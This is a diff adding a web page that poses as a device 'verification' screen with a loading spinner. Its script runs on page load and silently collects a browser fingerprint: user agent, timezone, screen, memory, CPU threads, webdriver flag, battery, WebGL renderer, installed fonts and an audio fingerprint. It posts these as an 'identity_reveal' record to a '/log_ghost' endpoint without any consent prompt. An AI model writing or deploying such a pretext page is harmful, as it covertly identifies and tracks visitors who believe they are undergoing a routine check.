@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verifying...</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    .loader {
+      margin-top: 20px;
+      border: 4px solid #0f0;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <h2>Hold tight… scanning device for verification 👁️‍🗨️</h2>
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    async function revealIdentity() {
+      const data = {
+        type: 'identity_reveal',
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        width: screen.width,
+        height: screen.height,
+        memory: navigator.deviceMemory || 'unknown',
+        threads: navigator.hardwareConcurrency || 'unknown',
+        headless: navigator.webdriver || false,
+        battery: {},
+        webgl: getWebGLRenderer(),
+        fonts: getFonts(),
+        audio_fp: await getAudioFingerprint(),
+        timestamp: new Date().toISOString()
+      };
+
+      try {
+        const battery = await navigator.getBattery();
+        data.battery = {
+          charging: battery.charging,
+          level: battery.level
+        };
+      } catch (e) {}
+
+      try {
+        await fetch("/log_ghost", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {
+        console.error("Logging failed", e);
+      }
+    }
+
+    function getFonts() {
+      const fonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana'];
+      const available = [];
+      const base = document.createElement("span");
+      base.innerText = "mmmmmmmmmmlli";
+      base.style.fontSize = "72px";
+      base.style.position = "absolute";
+      base.style.left = "-9999px";
+      document.body.appendChild(base);
+
+      const defaultWidth = base.offsetWidth;
+      const defaultHeight = base.offsetHeight;
+
+      for (const font of fonts) {
+        base.style.fontFamily = font;
+        if (base.offsetWidth !== defaultWidth || base.offsetHeight !== defaultHeight) {
+          available.push(font);
+        }
+      }
+
+      document.body.removeChild(base);
+      return available;
+    }
+
+    function getWebGLRenderer() {
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      } catch (e) {
+        return "unknown";
+      }
+    }
+
+    async function getAudioFingerprint() {
+      try {
+        return await new Promise(resolve => {
+          const context = new (window.AudioContext || window.webkitAudioContext)();
+          const oscillator = context.createOscillator();
+          const analyser = context.createAnalyser();
+          const gain = context.createGain();
+          const script = context.createScriptProcessor(4096, 1, 1);
+
+          oscillator.type = "triangle";
+          oscillator.frequency.setValueAtTime(10000, context.currentTime);
+          gain.gain.value = 0;
+
+          oscillator.connect(analyser);
+          analyser.connect(script);
+          script.connect(context.destination);
+          oscillator.start(0);
+
+          const fingerprint = [];
+          let count = 0;
+
+          script.onaudioprocess = function () {
+            const array = new Uint8Array(analyser.frequencyBinCount);
+            analyser.getByteFrequencyData(array);
+            fingerprint.push(array[0]);
+            count++;
+            if (count > 30) {
+              script.disconnect();
+              analyser.disconnect();
+              oscillator.disconnect();
+              context.close();
+              resolve(btoa(fingerprint.join(",")));
+            }
+          };
+        });
+      } catch (e) {
+        return "unavailable";
+      }
+    }
+
+    revealIdentity();
+  </script>
+</body>
+</html>
